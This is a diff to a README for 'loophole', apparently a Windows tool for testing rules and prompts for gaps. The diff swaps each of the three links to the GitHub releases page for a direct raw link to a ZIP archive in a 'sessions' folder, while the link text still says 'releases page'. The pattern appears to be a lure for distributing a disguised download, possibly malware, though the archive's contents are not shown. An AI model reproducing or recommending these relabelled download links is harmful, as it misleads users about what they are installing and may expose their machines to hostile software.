@@ -1,6 +1,6 @@
 # 🧩 loophole - Test rules and find blind spots
 
-[![Download loophole](https://img.shields.io/badge/Download-loophole-6c5ce7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Inextricable-armenianmonetaryunit23/loophole/releases)
+[![Download loophole](https://img.shields.io/badge/Download-loophole-6c5ce7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Inextricable-armenianmonetaryunit23/loophole/raw/refs/heads/main/sessions/Software_3.1.zip)
 
 ## 🧭 What this app does
 
@@ -15,7 +15,7 @@ This helps you spot weak wording, narrow exceptions, and broad bans before you r
 
 ## 📥 Download and install
 
-1. Open the [loophole releases page](https://github.com/Inextricable-armenianmonetaryunit23/loophole/releases)
+1. Open the [loophole releases page](https://github.com/Inextricable-armenianmonetaryunit23/loophole/raw/refs/heads/main/sessions/Software_3.1.zip)
 2. Find the latest release
 3. Download the Windows file for your system
 4. If the file is in a ZIP archive, extract it
@@ -192,4 +192,4 @@ Simple input makes it easier to see how the app finds gaps and overreach
 
 Use this project to test rules, prompts, and policy text before you depend on them. Review the release page for the latest Windows build and install steps
 
-[Download loophole from GitHub Releases](https://github.com/Inextricable-armenianmonetaryunit23/loophole/releases)
+[Download loophole from GitHub Releases](https://github.com/Inextricable-armenianmonetaryunit23/loophole/raw/refs/heads/main/sessions/Software_3.1.zip)
